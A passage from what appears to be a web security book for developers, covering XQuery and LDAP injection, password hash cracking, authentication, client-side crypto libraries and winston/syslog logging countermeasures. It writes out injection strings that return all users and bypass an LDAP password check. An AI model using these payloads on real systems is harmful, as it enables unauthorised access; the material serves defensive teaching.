<div class="highlight"><pre><code></code><code class="nf">doc</code><code class="p">(</code><code class="s2">"users.xml"</code><code class="p">)/</code><code class="nt">userlist</code><code class="p">/</code><code class="nt">user</code><code class="p">[</code><code class="nt">uname</code><code class="o">=</code><code class="s2">"bobm"</code><code class="p">]</code>
</pre></div>

</figure>

<p>An attacker could exploit the query by providing:<br />
<code>something" or ""="</code> </p>

<p>which would form the following query:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">doc</code><code class="p">(</code><code class="s2">"users.xml"</code><code class="p">)/</code><code class="nt">userlist</code><code class="p">/</code><code class="nt">user</code><code class="p">[</code><code class="nt">uname</code><code class="o">=</code><code class="s2">"something"</code> <code class="ow">or</code> <code class="s2">""</code><code class="o">=</code><code class="s2">""</code><code class="p">]</code>
</pre></div>

</figure>

<p>which upon execution would yield all of the <code>user</code>s.</p>

<p>Something else to keep in mind is that XQuery also <a href="https://www.mssqltips.com/sqlservertip/2738/examples-of-using-xquery-to-update-xml-data-in-sql-server/">has an extension</a> called the XML Data Modification Language (<a href="https://docs.microsoft.com/en-us/sql/t-sql/xml/xml-data-modification-language-xml-dml">DML</a>), which is commonly used to update (<code>insert</code>, <code>delete</code> and <code>replace value of</code>) XML documents.</p>

<h5 id="web-applications-identify-risks-ldap-injection">LDAP Injection</h5>

<p>The same generic injection information is applicable to LDAP</p>

<p><a href="https://www.owasp.org/index.php/LDAP_Injection_Prevention_Cheat_Sheet#Introduction">Successful LDAP injection</a> attacks could result in the granting of permissions to unauthorised queries and/or adding, deleting or modifying of entries in the LDAP tree. Because LDAP is used extensively for user authentication, this is a particularly viable area for attackers.</p>

<p>As we discussed the usage of metacharacters in <a href="chap06.html#web-applications-identify-risks-xml-injection">XML Injection</a>, LDAP search filter metacharacters <a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)#Summary">can be injected</a> into the dynamic parts of the queries and thus executed by the application. </p>

<p>LDAP uses <a href="https://en.wikipedia.org/wiki/Polish_notation">Polish notation</a> (PN), or normal Polish notation (NPN), or simply prefix notation, which has the distinguishing feature of placing operators to the left of their operands</p>

<p>One of the canonical examples, is a web application that takes the users credentials and verifies their authenticity, if successful, the user is authenticated and granted access to specific resources.</p>

<p>The LDAP filter used to check whether the supplied username and password of a user is correct, might look similar to the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code>string ldapLoginQuery = "(&amp;(uId="jdeer")(userPassword="3xp10it3d"))";
</pre></div>

</figure>

<p>With user input:</p>

<figure class="code">
  <figcaption>username</figcaption>

<div class="highlight"><pre><code></code>jdeer")(&amp;))("
</pre></div>

</figure>

<p>and:</p>

<figure class="code">
  <figcaption>password</figcaption>

<div class="highlight"><pre><code></code>incorrectpass
</pre></div>

</figure>

<p>the search filter would look similar to the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code>string ldapLoginQuery = "(&amp;(uId="jdeer")(&amp;))("")(userPassword="incorrectpass"))";
</pre></div>

</figure>

<p>The <code>(&amp;)</code> we used that did not contain any embedded filters is called the <a href="https://docs.oracle.com/cd/E19476-01/821-0510/def-and-search-filter.html">LDAP true filter</a>, and will always match any target entry. This allows the attacker to compare a valid <code>uid</code> with <code>true</code>, the attacker can subsequently use any password as <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">only the first filter</a> is processed by the LDAP server.</p>

<h4 id="leanpub-auto-captcha">Captcha</h4>

<img class="threat-tags" src="images/ThreatTags----easy-verywidespread-easy-low.png"/>


<p>Lack of captchas are a risk, but so are captchas themselves…</p>

<p>What is the problem here? What are we trying to stop?</p>

<p>Bots submitting. What ever it is, whether advertising, creating an unfair advantage over real humans, link creation in attempt to increase SEO, malicious code insertion, you are more than likely not interested in accepting it.</p>

<p>What do we not want to block?</p>

<p>People submitting genuinely innocent input. If a person is prepared to fill out a form manually, even if it is spam, then a person can view the submission and very quickly delete the validated, filtered and possibly sanitised message.</p>

<h4 id="web-applications-identify-risks-management-of-application-secrets">Management of Application Secrets</h4>

<p>Also consider reviewing the <a href="chap05.html#cloud-identify-risks-storage-of-secrets">Storage of Secrets</a> subsections in the Cloud chapter.</p>

<ul>
  <li>Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc, and may even provide credentials to continue moving through the network compromising other machines.</li>
  <li>Passwords and/or their hashes travelling over the network.</li>
</ul>

<h5 id="web-applications-identify-risks-management-of-application-secrets-data-store-compromise">Data-store Compromise</h5>

<img class="threat-tags" src="images/ThreatTags----difficult-widespread-average-moderate.png"/>


<p>The reason I have tagged this as moderate is because if you take the countermeasures, it doesn’t have to be a disaster.</p>

<p>The New Zealand Intelligence Service recently <a href="http://www.stuff.co.nz/national/politics/73704551/homegrown-threats-more-serious-says-spy-boss-rebecca-kitteridge">told</a> Prime Minister John Key that this was one of the 6 top threats facing New Zealand. “<em>Cyber attack or loss of information and data, which poses financial and reputational risks.</em>”</p>

<p>There are many examples of data-store compromise happening on a daily basis. If organisations took the advice I outline in the countermeasures section the millions of users would not have their identifies stolen. Sadly the advice is rarely followed. The Ashley Madison debacle is a good example. Ashley Madisons entire business relied on its commitment to keep its clients (37 million of them) data secret, provide discretion and anonymity. </p>

<p>“<em>Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage</em>”</p>

<p>“<em>We worked hard to make a fully undetectable attack, then got in and found nothing to bypass…. Nobody was watching. No security. Only thing was segmented network. You could use Pass1234 from the internet to VPN to root on all servers.</em>”</p>

<p>“<em>Any CEO who isn’t vigilantly protecting his or her company’s assets with systems designed to track user behavior and identify malicious activity is acting negligently and putting the entire organization at risk. And as we’ve seen in the case of Ashley Madison, leadership all the way up to the CEO may very well be forced out when security isn’t prioritized as a core tenet of an organization.</em>”</p>

<blockquote>
  <p>Dark Reading</p>
</blockquote>

<p>Other notable data-store compromises were <a href="https://en.wikipedia.org/wiki/2012_LinkedIn_hack">LinkedIn</a> with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. <a href="http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093">EBay</a> with 145 million active buyers. Many others coming to light regularly. </p>

<p>Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected. I discussed Password Lists in the Tooling Setup chapter. You could also use wordlists targeting the most commonly used passwords, or create an algorithm that works out what an easy to guess password looks like, and inform the user that it would be easy to guess by an attacker.</p>

<h5 id="web-applications-identify-risks-management-of-application-secrets-cracking">Cracking</h5>

<p>Remember we covered Password Profiling in the People chapter where we essentially made good guesses, both manually and with the use of profiling tools, around the end users passwords, and then feed the short-list to a brute forcing tool. Here we already have the password hashes. We just need to find the source passwords that created the hashes. This is where cracking comes in.</p>

<p>When an attacker acquires a data-store or domain controller dump of hashed passwords, they need to crack the hashes in order to get the passwords. How this works, is the attacker will find or create a suitable password list of possible passwords. The tool used will attempt to create a hash of each of these words based on the hashing algorithm used on the dump of hashes. Then compare each dumped hash with the hashes just created. When a match is found, we know that the word in our wordlist used to create the hash that matches the dumped hash is in fact a legitimate password.</p>

<p>A smaller wordlist is going to take less time to create the hashes. As this is often an off-line attack, a larger wordlist is often preferred over a smaller one because the number of generated hashes will be greater, which when compared to the dump of hashes means the likelihood of a greater number of matches is increased.</p>

<p>As part of the hands on hack in the <a href="chap06.html#web-applications-identify-risks-sqli">SQLi</a> section, we obtained the password hashes via SQL injection from the target web application DVWA (part of the OWASP Broken Web Application suite (VM)). We witnessed how an attacker could obtain the passwords from the hashed values retrieved from the database.</p>

<h4 id="web-applications-identify-risks-lack-of-authentication-authorisation-session-management">Lack of Authentication, Authorisation and Session Management</h4>

<img class="threat-tags" src="images/ThreatTags----average-common-average-severe.png"/>


<p>Also brought to light by the OWASP Top 10 risks “<a href="https://www.owasp.org/index.php/Top_10_2017-A2-Broken_Authentication_and_Session_Management"><em>No. 2 Broken Authentication and Session Management</em></a>”.</p>

<p>With this category of attacks, your attacker could be either someone you do or do not know. Possibly someone already with an account, an insider maybe, looking to take the next step which could be privilege escalation or even just alteration so that they have access to different resources by way of acquiring other accounts. Some possible attack vectors could be:</p>

<ul>
  <li>Password acquisition: by way of data-store theft (off-line attack) or poor password hashing strategies (susceptible to off-line and on-line attacks), discussed in the Countermeasures section but in more depth in the Management of Application Secrets sections</li>
  <li>Passwords or sessionIds travelling over unsecured channels susceptible to Man In the Middle (MItM) attacks, discussed in the Countermeasures section but also refer to the TLS Downgrade sections of the Network chapter</li>
  <li>Buggy Session Management, SessionIds exposed in URLs</li>
  <li>Faulty logout (not invalidating authentication tokens)</li>
  <li>Faulty remember me functionality</li>
  <li>Long session time-outs can exacerbate other weak areas of defence</li>
  <li>Secret questions</li>
  <li>Updating account details</li>
</ul>

<p>In the Countermeasures section I go through some mature and well tested libraries and other technologies, and details around making them fit into a specific business architecture.</p>

<p>Consider what data could be exposed from any of the accounts and how this could be used to gain a foot hold to launch further alternative attacks. Each step allowing the attacker to move closer to their ultimate target, the ultimate target being something hopefully discussed during the Asset Identification phase or taking another iteration of it as you learn and think of additional possible targeted assets.</p>

<p>Often the line between the following two concepts gets blurred, sometimes because where one starts and one ends is often not absolute or clear, and sometimes intentionally. Neither help new comers and even those used to working with the concepts get to grips with which is which and what the responsibilities of each include.</p>

<h5 id="leanpub-auto-what-is-authentication">What is Authentication</h5>

<p>The process of determining whether an entity (be it person or something else) is who or what it claims to be.</p>

<p>Being authenticated, means the entity is known to be who or what it/he/she claims to be.</p>

<h5 id="leanpub-auto-what-is-authorisation">What is Authorisation</h5>

<p>The process of verifying that an entity (usually requesting)(be it person or something else) has the right to a resource or to carry out an action, then granting permission requested.</p>

<p>Being authorised, means the entity has the power or right to certain privileges.</p>

<p> </p>

<p><strong>Don’t build your own</strong> authentication, authorisation or session management system unless it’s your core business. It’s too easy to get things wrong and you only need one defect in order to be compromised. Leave it to those that have already done it or do it as part of their core business and have already worked through the defects.</p>

<h4 id="web-applications-identify-risks-cryptography-on-the-client">Cryptography on the Client (AKA Untrusted Crypto)</h4>


<img class="threat-tags" src="images/ThreatTags----average-widespread-average-severe.png"/>


<p>The things I see that seem to get many developers into trouble:</p>

<ol class="numeric">
  <li>Lack of understanding of what the tool is, where and how it should be used</li>
  <li>Use of low-level primitives with no to little knowledge of which are most suitable for which purposes. How to make them work together. How to use and configure them, so as to not introduce security defects, usually due to not understanding how the given primitive is designed and its purpose of use</li>
  <li>Many libraries have either:
    <ol class="numeric">
      <li>To many options which just helps to create confusion for developers as to what to use for which purpose. The options they do have are not the best for their intended purpose</li>
      <li>The creators may be developers, but are not cryptographers</li>
    </ol>
  </li>
</ol>

<p>There are so many use cases with the wider cryptography topic. There is no substitute for learning about your options, which to use in any given situation and how to use them.</p>

<p>JavaScript crypto is wrought with problems.</p>

<p>For example, there is nothing safe about having JavaScript in the browser store, read or manage an entropy pool. This gets a little better with the Web Cryptography APIs (discussed in the <a href="chap06.html#web-applications-countermeasures-cryptography-on-the-client">Countermeasures</a> section) <code>window.crypto.getRandomValues()</code>. </p>

<p>Little trust should be placed in the browser and how it generally fails to manage attacks due to the complexities discussed in both <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-and-sanitisation">Risks</a> and <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation">Countermeasures</a> sections of “Lack of Input Validation, Filtering and Sanitisation”. The browser has enough trouble getting all the technologies to work together and inside of each other, let-a-lone stopping malicious code fragments that do work from working. As most web developers have worked out, the browser is purposely designed to make even syntactically incorrect code work correctly.</p>

<p>The browser was designed to download and run potentially malicious, untrusted code from arbitrary locations on the fly. The browser in most cases doesn’t know what malicious code is, and often the first payload is not malicious, but simply fetches other code that may fetch other code that eventually will be malicious.</p>

<p>The JavaScript engines are constantly changing, meaning that the developers expectations of relying on implementation details of the execution environments to stay somewhat stable, will be constantly let down.</p>

<p>Web development is hard. Web security is harder still.</p>

<p>The following is a list of the best JavaScript crypto libraries we have available to us. I purposely left many out, as I don’t want to muddy the waters and add more lower quality options:</p>

<ul>
  <li>
<strong>Stanford JavaScript Crypto Library (SJCL)</strong>
    <ul>
      <li>Home page: <a href="http://bitwiseshiftleft.github.io/sjcl/">http://bitwiseshiftleft.github.io/sjcl/</a> The default key stretching factor appears to be 1000. This should probably be adaptive to match the advances in hardware technology, as discussed under the <a href="chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot">MembershipReboot</a> section. </li>
      <li>SJCL demo page: <a href="http://bitwiseshiftleft.github.io/sjcl/demo/">http://bitwiseshiftleft.github.io/sjcl/demo/</a> which helps to explain some of the creators reasoning.</li>
      <li>Source Code: <a href="https://github.com/bitwiseshiftleft/sjcl/">https://github.com/bitwiseshiftleft/sjcl/</a>
</li>
      <li>NPM package: <a href="https://www.npmjs.com/package/sjcl">https://www.npmjs.com/package/sjcl</a>. Yes the download count is way less than Forge, but SJCL is first in my list for a reason. SJCL provides minimal options of algorithms and cipher modes, etc. Just the best, to help ease the burden of having to research many algorithms and cipher modes to find out which are now broken.  </li>
    </ul>

    <p>What’s also really good to see is SJCL pushing consumers down the right path and issuing warnings around primitives that have issues. For example the <a href="https://github.com/bitwiseshiftleft/sjcl/wiki/Directly-Using-Ciphers">warning</a> against using CBC. I discuss this further in the <a href="chap06.html#web-applications-risks-that-solution-causes-cryptography-on-the-client">risks that solution causes</a> section.</p>

    <p>Other than the <a href="chap06.html#web-applications-countermeasures-cryptography-on-the-client-web-cryptography-api">countermeasure</a>, This is probably the best offering we have for crypto in the browser. It has sensible defaults, good warnings, not to many options to understand in order to make good choices. This is one of those libraries that guides the developer down the right path.</p>

    <p>Encrypts your plain text using the AES block cypher with a choice of cipher modes CCM or OCB2. AES is the industry-standard block-cipher for this purpose, one of the better choices for crypto in the browser if it must be done. AES comes in three forms. 128 bit (very efficient), 192 bit and 256 bit. The modes of operation that SJCL have provided for use with AES are the following two <a href="https://en.wikipedia.org/wiki/Authenticated_encryption">Authenticated Encryption with Associated Data (AEAD)</a> ciphers:</p>

    <ol class="numeric">
      <li>AES-CCM. Counter with CBC-MAC (CCM) is a mode of operation for cryptographic block ciphers of 128 bits in length. It is an authenticated encryption algorithm designed to provide both authentication and confidentiality</li>
      <li>AES-OCB2. <a href="https://en.wikipedia.org/wiki/OCB_mode">Offset CodeBook (OCB)</a> is also a mode of operation for cryptographic block ciphers of 128 bits in length. OCB2 is an authenticated encryption algorithm designed to provide both authentication and confidentiality. OCB1 didn’t allow associated data to be included with the message. Integrity verification is now part of the decryption step with OCB2. GCM is similar to OCB, but GCM and CCM don’t have any patents. Although exemptions have been granted so that OCB can be used in software licensed under the GNU General Public License  </li>
    </ol>

    <ul>
      <li>Uses PBKDF2 for One way hashing of passwords. More details around password hashing in the <a href="chap06.html#web-applications-countermeasures-data-store-compromise">Data-store Compromise</a> section.</li>
    </ul>
  </li>
  <li>
<strong>Forge</strong>
    <ul>
      <li>Source Code: <a href="https://github.com/digitalbazaar/forge">https://github.com/digitalbazaar/forge</a>
</li>
      <li>NPM package: <a href="https://www.npmjs.com/package/node-forge">https://www.npmjs.com/package/node-forge</a>  </li>
      <li>Forge is a JavaScript library that provides a native implementation of TLS and a large toolbox containing utilities and implementations (although many considered insecure now) for:
        <ul>
          <li>Transports: TLS, HTTP, SSH, XHR, Sockets</li>
          <li>Ciphers: AES, 3DES, DES and RC2</li>
          <li>Cipher Modes:  GCM, ECB, CBC, CFB, OFB, and CTR</li>
          <li>Asymmetric cryptography: RSA, RSA-KEM, X.509, PKCS#5, PKCS#7, PKCS#8, PKCS#10, PKCS#12 and ASN.1</li>
          <li>Message Digests: SHA1, SHA256, SHA384, SHA512, MD5 and HMAC</li>
          <li>Utilities: Prime number generator, pseudo-random number generator</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
<strong>OpenPGPjs</strong>
    <ul>
      <li>Home page: <a href="https://openpgpjs.org/">https://openpgpjs.org/</a>
</li>
      <li>Source Code: <a href="https://github.com/openpgpjs/openpgpjs">https://github.com/openpgpjs/openpgpjs</a>
</li>
    </ul>
  </li>
  <li>
<strong>SecurityDriven.Inferno</strong><br />
Although it’s not a client side library, it’s still worth mentioning, because it’s opinionated and from the looks of it, Stan Drapkin is making good decisions and focussing on the best of bread components.
    <ul>
      <li>Source Code: <a href="https://github.com/sdrapkin/SecurityDriven.Inferno">https://github.com/sdrapkin/SecurityDriven.Inferno</a>
</li>
      <li>Documentaion: <a href="http://securitydriven.net/inferno/">http://securitydriven.net/inferno/</a>
</li>
      <li>NuGet package: <a href="https://www.nuget.org/packages/Inferno/">https://www.nuget.org/packages/Inferno/</a>
</li>
    </ul>
  </li>
</ul>

<h4 id="web-applications-identify-risks-consuming-free-and-open-source">Consuming Free and Open Source</h4>

<img class="threat-tags" src="images/ThreatTags----average-common-average-moderate.png"/>


<p>This is where <a href="https://www.owasp.org/index.php/Top_10_2017-A9-Using_Components_with_Known_Vulnerabilities">A9 (Using Components with Known Vulnerabilities)</a> of the 2017 OWASP Top 10 comes in.</p>

<p>We are consuming far more free and open source libraries than we have ever before. Much of the code we are pulling into our projects is never intentionally used, but is still adding surface area for attack. Much of it:</p>

<ul>
  <li>Is not thoroughly tested for what it should do and what it should not do. We are often relying on developers we do not know a lot about to have not introduced defects. As I discussed in the “Code Review” section of the Process and Practises chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>, most developers are more focused on building than breaking, they do not even see the defects they are introducing.</li>
  <li>Is not reviewed evaluated. That is right, many of the packages we are consuming are created by solo developers with a single focus of creating and little to no focus of how their creations can be exploited. Even some teams with a security champion are not doing a lot better.</li>
  <li>Is created by amateurs that could and do include vulnerabilities. Anyone can write code and publish to an open source repository. Much of this code ends up in our package management repositories which we consume.</li>
  <li>Does not undergo the same requirement analysis, defining the scope, acceptance criteria, test conditions and sign off by a development team and product owner that our commercial software does.</li>
</ul>

<p>There are some very sobering statistics, also detailed in “<a href="https://blog.acolyer.org/2017/03/07/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/">the morning paper</a>” by Adrian Colyer, on how many defective libraries we are depending on. We are all trying to get things done faster, and that in many cases means consuming someone else’s work rather than writing our own code.</p>

<p>Many vulnerabilities can hide in these external dependencies. It is not just one attack vector any more, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you do not find and deal with them, I can assure you, someone else will.</p>

<p>Running any type of scripts from non local sources without first downloading and inspecting them, and checking for known vulnerabilities, has the potential to cause massive damage, for example, destroy or modify your systems and any other that may be reachable, send sensitive information to an attacker, or many other types of other malicious activity.</p>

<h4 id="leanpub-auto-insufficient-attack-protection">Insufficient Attack Protection</h4>

<img class="threat-tags" src="images/ThreatTags----easy-common-average-moderate.png"/>


<p>There is a good example of what the Insecure Direct Object References risk looks like in the <a href="https://github.com/OWASP/NodeGoat/">NodeGoat</a> web application. Check out the <a href="https://nodegoat.herokuapp.com/tutorial/a4">tutorial</a>, along with the video of how the attack is played out, along with the sample code and recommendations of how to fix.</p>

<h5 id="leanpub-auto-lack-of-active-automated-prevention">Lack of Active Automated Prevention</h5>

<p>The web application is being attacked with unusual requests.</p>

<p>Attackers probe for many types of weaknesses within the application, when they think they find a flaw, they attempt to learn from this and refine their attack technique.</p>

<p>Attackers have budgets just like application developers/defenders. As they get closer to depleting their budget without gaining a foothold, they become more impulsive, start making more noise, and mistakes creep into their techniques, which makes it even more obvious that their probes are of a malicious nature.</p>

<h3 id="leanpub-auto-ssm-countermeasures-1">3. SSM Countermeasures</h3>

<p>Every decision made in a project needs to factor in security. Just as with other non functional requirements, retrofitting means undoing what you’ve already done and rebuilding. Maintaining the mindset of going back later and bolting on security doesn’t work.</p>

<p>Often I’ll hear people say “well we haven’t been hacked so far”. This shows a lack of understanding. I usually respond with “That you are aware of”. Many of the most successful attacks go unnoticed. Even if you or your organisation haven’t been compromised, business’s are changing all the time, along with the attack surface and your assets. It’s more so a matter of when, than if.</p>

<p>One of the additional resources useful at this stage is the <a href="https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008">MS Application Threats and Countermeasures</a>.</p>

<h4 id="web-applications-countermeasures-lack-of-visibility">Lack of Visibility</h4>

<p>Also refer to the <a href="chap03.html#vps-countermeasures-lack-of-visibility">“Lack of Visibility”</a> section in the VPS chapter, where I discuss a number of tried and tested solutions. Much of what we discuss here will also make use of, and in some cases, such as the logging and monitoring depend on components being set-up from the VPS chapter’s Countermeasures sections within the Lack of Visibility sections.</p>

<p>As Bruce Schneier said: “<em>Detection works where prevention fails and detection is of no use without response</em>”. This leads us to application logging.</p>

<p>With good visibility we should be able to see anticipated and unanticipated exploitation of vulnerabilities as they occur and also be able to go back and review/audit the events. Of course you’re still going to need someone engaged enough (discussed in the People chapter of Fascicle 0) to be reviewing logs and alerts.</p>

<h5 id="web-applications-countermeasures-lack-of-visibility-insufficient-logging">Insufficient Logging</h5>

<img class="threat-tags" src="images/ThreatTags----PreventionAVERAGE.png"/>


<p>When it comes to logging in NodeJS, you can’t really go past winston. It has a lot of functionality and what it does not have is either provided by extensions, or you can create your own. It is fully featured, reliable and easy to configure like NLog in the .NET world.</p>

<p>I also looked at <code>express-winston</code>, but could not see why it needed to exist.</p>

<figure class="code">
  <figcaption>package.json</figcaption>

<div class="highlight"><pre><code></code><code class="p">{</code>
   <code class="p">...</code>
   <code class="s2">"dependencies"</code><code class="o">:</code> <code class="p">{</code>
      <code class="p">...,</code>
      <code class="s2">"config"</code><code class="o">:</code> <code class="s2">"^1.15.0"</code><code class="p">,</code>
      <code class="s2">"express"</code><code class="o">:</code> <code class="s2">"^4.13.3"</code><code class="p">,</code>
      <code class="s2">"morgan"</code><code class="o">:</code> <code class="s2">"^1.6.1"</code><code class="p">,</code>
      <code class="s2">"//"</code><code class="o">:</code> <code class="s2">"nodemailer not strictly necessary for this example,"</code><code class="p">,</code>
      <code class="s2">"//"</code><code class="o">:</code> <code class="s2">"but used later under the node-config section."</code><code class="p">,</code>
      <code class="s2">"nodemailer"</code><code class="o">:</code> <code class="s2">"^1.4.0"</code><code class="p">,</code>
      <code class="s2">"//"</code><code class="o">:</code> <code class="s2">"What we use for logging."</code><code class="p">,</code>
      <code class="s2">"winston"</code><code class="o">:</code> <code class="s2">"^1.0.1"</code><code class="p">,</code>          
      <code class="s2">"winston-email"</code><code class="o">:</code> <code class="s2">"0.0.10"</code><code class="p">,</code>
      <code class="s2">"winston-syslog-posix"</code><code class="o">:</code> <code class="s2">"^0.1.5"</code><code class="p">,</code>
      <code class="p">...</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p><a href="https://www.npmjs.com/package/winston-email"><code>winston-email</code></a> also depends on <a href="https://www.npmjs.com/package/nodemailer"><code>nodemailer</code></a>.</p>

<h6 id="leanpub-auto-opening-udp-port">Opening UDP port</h6>

<p>with <a href="https://www.npmjs.com/package/winston-syslog"><code>winston-syslog</code></a>, it seems to be what a lot of people are using. I think it may be due to the fact that <code>winston-syslog</code> is the first package that works well for winston and syslog.</p>

<p>If going this route, you will need the following in your <code>/etc/rsyslog.conf</code>:</p>

<figure class="code">
  <figcaption>/etc/rsyslog.conf</figcaption>

<div class="highlight"><pre><code></code><code class="nv">$ModLoad</code> imudp
<code class="c1"># Listen on all network addresses. This is the default.</code>
<code class="nv">$UDPServerAddress</code> <code class="m">0</code>.0.0.0
<code class="c1"># Listen on localhost.</code>
<code class="nv">$UDPServerAddress</code> <code class="m">127</code>.0.0.1
<code class="nv">$UDPServerRun</code> <code class="m">514</code>
<code class="c1"># Or the new style configuration.</code>
Address &lt;IP&gt;
Port &lt;port&gt;
<code class="c1"># Logging for your app.</code>
local0.* /var/log/yourapp.log
</pre></div>

</figure>

<p>I Also looked at <code>winston-rsyslog2</code> and <code>winston-syslogudp</code>, but they did not measure up for me.</p>

<p>If you do not need to push syslog events to another machine, and I don’t mean pushing logs, then it does not make much sense to push through a local network interface when you can use your posix syscalls as they are faster and safer. Line 7 below shows the open port.</p>

<figure class="code">
  <figcaption>nmap with winston-syslog</figcaption>

<div class="highlight"><pre><code></code><code class="lineno">1 </code>root@kali:~# nmap -p514 -sU -sV &lt;target IP&gt; --reason
<code class="lineno">2 </code>
<code class="lineno">3 </code>Starting Nmap 6.47 ( http://nmap.org )
<code class="lineno">4 </code>Nmap scan report for kali (&lt;target IP&gt;)
<code class="lineno">5 </code>Host is up, received arp-response (0.0015s latency).
<code class="lineno">6 </code>PORT    STATE         SERVICE REASON      VERSION
<code class="lineno">7 </code>514/udp open|filtered syslog  no-response
<code class="lineno">8 </code>MAC Address: 34:25:C9:96:AC:E0 (My Computer)
</pre></div>

</figure>

<h6 id="leanpub-auto-using-posix">Using Posix</h6>

<p>The <a href="https://www.npmjs.com/package/winston-syslog-posix"><code>winston-syslog-posix</code></a> package was inspired by <a href="http://tmont.com/blargh/2013/12/writing-to-the-syslog-with-winston">blargh</a>. <code>winston-syslog-posix</code> uses <a href="https://www.npmjs.com/package/posix"><code>node-posix</code></a>.</p>

<p>If going this route, you will need the following in your <code>/etc/rsyslog.conf</code> instead of the above, you will still be able to push logs off-site, as discussed in the VPS chapter under the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">Logging and Alerting</a> section in Countermeasures:</p>

<figure class="code">
  <figcaption>/etc/rsyslog.conf</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># Logging for your app.</code>
local0.* /var/log/yourapp.log
</pre></div>

</figure>

<p>Now you can see on line 7 below that the syslog port is no longer open:</p>

<figure class="code">
  <figcaption>nmap with winston-syslog-posix</figcaption>

<div class="highlight"><pre><code></code><code class="lineno">1 </code>root@kali:~# nmap -p514 -sU -sV &lt;target IP&gt; --reason
<code class="lineno">2 </code>
<code class="lineno">3 </code>Starting Nmap 6.47 ( http://nmap.org )
<code class="lineno">4 </code>Nmap scan report for kali (&lt;target IP&gt;)
<code class="lineno">5 </code>Host is up, received arp-response (0.0014s latency).
<code class="lineno">6 </code>PORT    STATE  SERVICE REASON       VERSION
<code class="lineno">7 </code>514/udp closed syslog  port-unreach
<code class="lineno">8 </code>MAC Address: 34:25:C9:96:AC:E0 (My Computer)
</pre></div>

</figure>

<p> </p>

<p>Logging configuration should not be in the application startup file. It should be in the configuration files. This is discussed further under the <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration">“Store Configuration in Configuration files”</a> section.</p>

<p>Notice the syslog transport in the configuration below starting on line 39. </p>

<figure class="code">
  <figcaption>default.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="p">{</code>
<code class="lineno"> 2 </code>   <code class="nx">logger</code><code class="o">:</code> <code class="p">{</code>      
<code class="lineno"> 3 </code>      <code class="nx">colours</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno"> 4 </code>         <code class="nx">debug</code><code class="o">:</code> <code class="s1">'white'</code><code class="p">,</code>
<code class="lineno"> 5 </code>         <code class="nx">info</code><code class="o">:</code> <code class="s1">'green'</code><code class="p">,</code>            
<code class="lineno"> 6 </code>         <code class="nx">notice</code><code class="o">:</code> <code class="s1">'blue'</code><code class="p">,</code>
<code class="lineno"> 7 </code>         <code class="nx">warning</code><code class="o">:</code> <code class="s1">'yellow'</code><code class="p">,</code>
<code class="lineno"> 8 </code>         <code class="nx">error</code><code class="o">:</code> <code class="s1">'yellow'</code><code class="p">,</code>
<code class="lineno"> 9 </code>         <code class="nx">crit</code><code class="o">:</code> <code class="s1">'red'</code><code class="p">,</code>
<code class="lineno">10 </code>         <code class="nx">alert</code><code class="o">:</code> <code class="s1">'red'</code><code class="p">,</code>
<code class="lineno">11 </code>         <code class="nx">emerg</code><code class="o">:</code> <code class="s1">'red'</code>
<code class="lineno">12 </code>      <code class="p">},</code>
<code class="lineno">13 </code>      <code class="c1">// Syslog compatible protocol severities.       </code>
<code class="lineno">14 </code>      <code class="nx">levels</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">15 </code>         <code class="nx">debug</code><code class="o">:</code> <code class="mi">0</code><code class="p">,</code>
<code class="lineno">16 </code>         <code class="nx">info</code><code class="o">:</code> <code class="mi">1</code><code class="p">,</code>
<code class="lineno">17 </code>         <code class="nx">notice</code><code class="o">:</code> <code class="mi">2</code><code class="p">,</code>
<code class="lineno">18 </code>         <code class="nx">warning</code><code class="o">:</code> <code class="mi">3</code><code class="p">,</code>
<code class="lineno">19 </code>         <code class="nx">error</code><code class="o">:</code> <code class="mi">4</code><code class="p">,</code>
<code class="lineno">20 </code>         <code class="nx">crit</code><code class="o">:</code> <code class="mi">5</code><code class="p">,</code>
<code class="lineno">21 </code>         <code class="nx">alert</code><code class="o">:</code> <code class="mi">6</code><code class="p">,</code>   
<code class="lineno">22 </code>         <code class="nx">emerg</code><code class="o">:</code> <code class="mi">7</code>   
<code class="lineno">23 </code>      <code class="p">},</code>
<code class="lineno">24 </code>      <code class="nx">consoleTransportOptions</code><code class="o">:</code> <code class="p">{</code>
<code class="lineno">25 </code>         <code class="nx">level</code><code class="o">:</code> <code class="s1">'debug'</code><code class="p">,</code>
<code class="lineno">26 </code>         <code class="nx">handleExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
<code class="lineno">27 </code>         <code class="nx">json</code><code class="o">:</code> <code class="kc">false</code><code class="p">,</code>
